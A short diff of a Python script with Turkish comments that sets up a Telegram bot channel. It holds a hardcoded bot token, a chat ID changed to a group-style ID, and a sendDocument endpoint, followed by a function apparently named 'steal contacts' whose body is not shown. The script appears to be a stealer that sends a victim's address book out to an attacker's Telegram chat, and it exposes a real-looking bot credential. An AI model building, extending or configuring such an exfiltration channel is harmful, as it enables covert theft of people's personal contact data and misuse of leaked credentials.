@@ -6,7 +6,7 @@ import requests
 
 # Telegram Bot Ayarları
 BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
-CHAT_ID = "4804654305"
+CHAT_ID = "-4804654305"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 
 def rehber_cal():
